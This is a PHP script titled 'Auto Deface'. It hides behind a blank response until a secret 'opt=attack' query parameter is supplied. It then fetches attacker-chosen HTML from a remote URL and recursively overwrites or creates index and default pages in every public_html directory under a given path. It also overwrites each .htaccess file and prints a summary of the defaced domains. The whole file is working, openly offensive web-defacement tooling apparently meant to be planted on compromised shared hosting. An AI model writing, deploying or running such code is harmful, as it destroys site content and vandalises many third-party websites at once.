<?php
if(isset($_GET["opt"]) && $_GET["opt"] == "attack"){
    ob_start();
    $GLOBALS['changed_domains'] = array();
    ?>
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <link rel="icon" href="https://raw.githubusercontent.com/thesharkin/DefacePage/refs/heads/main/assets/image/sharkin-circle-logo.png">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Auto Deface</title>
        <style>
            body {
                background: #1a1a1a;
                color: #33ff33;
                font-family: 'Courier New', monospace;
                margin: 0;
                padding: 20px;
                font-size: 14px;
                line-height: 1.4;
            }
            a {
                -webkit-text-stroke: 1px green;
                text-shadow: 2px 2px 10px green;
                text-decoration: none;
                color: transparent;
                font-size: 50px;
            }
            .log-container {
                background: rgba(0, 0, 0, 0.8);
                border: 1px solid #33ff33;
                padding: 15px;
                margin: 10px 0;
                border-radius: 5px;
                box-shadow: 0 0 10px rgba(51, 255, 51, 0.2);
            }
            .log-entry {
                margin: 5px 0;
                padding: 5px;
                border-left: 2px solid #33ff33;
                padding-left: 10px;
            }
            .success {
                color: #33ff33;
            }
            .error {
                color: #ff3333;
            }
            .status {
                text-align: center;
                margin-top: 20px;
                padding: 10px;
                border: 1px solid #33ff33;
                border-radius: 3px;
            }
            .domain-summary {
                margin-top: 20px;
                padding: 15px;
                border: 1px solid #33ff33;
                border-radius: 5px;
            }
            .domain-summary h2 {
                color: #33ff33;
                margin: 0 0 10px 0;
                font-size: 16px;
                text-align: center;
                border-bottom: 1px solid #33ff33;
                padding-bottom: 5px;
            }
            .domain-list {
                list-style: none;
                padding: 0;
                margin: 0;
            }
            .domain-list li {
                padding: 5px 0;
                border-bottom: 1px dotted rgba(51, 255, 51, 0.3);
            }
            .domain-list li:last-child {
                border-bottom: none;
            }
            .counter {
                color: #ffff33;
                font-weight: bold;
            }
        </style>
    </head>
    <body>
        <div class="log-container">
    <?php
    
    $path = $_GET["path"];
    
    if(!isset($_GET["defaceSource"])) {
        echo "<div class='log-entry error'>Error: defaceSource parameter is required</div>";
        die();
    }
    
    $defaceSource = @file_get_contents($_GET["defaceSource"]);
    if($defaceSource === false) {
        echo "<div class='log-entry error'>Error: Could not fetch content from defaceSource URL</div>";
        die();
    }
    
    function updateHomePageFiles($dir) {
        if (!is_dir($dir)) {
            echo "<div class='log-entry error'>Directory does not exist: $dir</div>";
            return;
        }
        
        $handle = opendir($dir);
        if ($handle) {
            while (false !== ($entry = readdir($handle))) {
                if ($entry === '.' || $entry === '..') {
                    continue;
                }
                $fullPath = $dir . '/' . $entry;

                if (is_dir($fullPath)) {
                    if ($entry === 'public_html') {
                        updateIndexFiles($fullPath, $GLOBALS['defaceSource']);
                        $domainPath = dirname($fullPath);
                        $domain = basename($domainPath);
                        if (!in_array($domain, $GLOBALS['changed_domains'])) {
                            $GLOBALS['changed_domains'][] = $domain;
                        }
                    } else {
                        updateHomePageFiles($fullPath);
                    }
                }
            }
            closedir($handle);
        }
    }

    function updateIndexFiles($publicHtmlPath, $defaceSource) {
        $indexFiles = ['index.html', 'index.php', 'default.php', 'default.html'];
        $foundIndexFile = false;

        foreach ($indexFiles as $file) {
            $filePath = $publicHtmlPath . '/' . $file;
            if (file_exists($filePath)) {
                $content = $defaceSource;
                file_put_contents($filePath, $content);
                echo "<div class='log-entry success'>Replaced: $filePath</div>";
                $foundIndexFile = true;
            }
        }

        if (!$foundIndexFile) {
            $newIndexFilePath = $publicHtmlPath . '/index.html';
            $content = $defaceSource;
            file_put_contents($newIndexFilePath, $content);
            echo "<div class='log-entry success'>Created: $newIndexFilePath</div>";
        }

        updateHtaccess($publicHtmlPath);
    }

    function updateHtaccess($publicHtmlPath) {
        $htaccessPath = $publicHtmlPath . '/.htaccess';

        if (file_exists($htaccessPath)) {
            $htaccessContent = "DirectoryIndex index.html\n";
            file_put_contents($htaccessPath, $htaccessContent);
            echo "<div class='log-entry success'>Replaced .htaccess: $htaccessPath</div>";
        } else {
            $htaccessContent = "DirectoryIndex index.html\n";
            file_put_contents($htaccessPath, $htaccessContent);
            echo "<div class='log-entry success'>Created .htaccess: $htaccessPath</div>";
        }
    }
    $GLOBALS['defaceSource'] = $defaceSource;
    
    updateHomePageFiles($path);
    
    if (!empty($GLOBALS['changed_domains'])) {
        echo "<div class='domain-summary'>";
        echo "<h2>Modified Domains Summary</h2>";
        echo "<div class='counter'>Total Domains Modified: " . count($GLOBALS['changed_domains']) . "</div>";
        echo "<ul class='domain-list'>";
        sort($GLOBALS['changed_domains']);
        foreach ($GLOBALS['changed_domains'] as $domain) {
            echo "<li>➤ " . htmlspecialchars($domain) . "</li>";
        }
        echo "</ul>";
        echo "</div>";
    }
    
    echo "<div class='status success'>Operation completed successfully</div>";
    echo "<div class='status success'><a  target='_blank' href='https://github.com/thesharkin'>Codde By Shakin</a></div>";
    ?>
        </div>
    </body>
    </html>
    <?php
    ob_end_flush();
} else {
    echo "";
}
?>
